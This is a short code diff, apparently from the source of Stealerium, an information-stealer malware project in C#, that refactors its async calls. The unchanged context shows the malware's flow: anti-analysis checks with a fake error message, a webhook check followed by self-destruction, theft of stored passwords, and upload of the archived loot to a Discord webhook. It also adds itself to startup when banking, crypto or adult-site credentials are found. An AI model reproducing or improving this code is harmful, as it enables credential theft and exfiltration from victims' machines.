@@ -41,7 +41,7 @@ namespace Stealerium
                 StartDelay.Run();
 
             // Run AntiAnalysis modules
-            if (await AntiAnalysis.RunAsync())
+            if (await AntiAnalysis.RunAsync().ConfigureAwait(false))
                 AntiAnalysis.FakeErrorMessage();
 
 
@@ -52,7 +52,7 @@ namespace Stealerium
             Config.Init();
 
             // Test Webhook if valid
-            if (!await DiscordWebHook.WebhookIsValid())
+            if (!await DiscordWebHook.WebhookIsValidAsync().ConfigureAwait(false))
                 SelfDestruct.Melt();
 
             // Steal passwords
@@ -60,7 +60,7 @@ namespace Stealerium
             // Compress directory
             var archive = Filemanager.CreateArchive(passwords);
             // Send archive
-            await DiscordWebHook.SendReport(archive);
+            await DiscordWebHook.SendReportAsync(archive).ConfigureAwait(false);
 
             // Install to startup if enabled in config and not installed
             if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
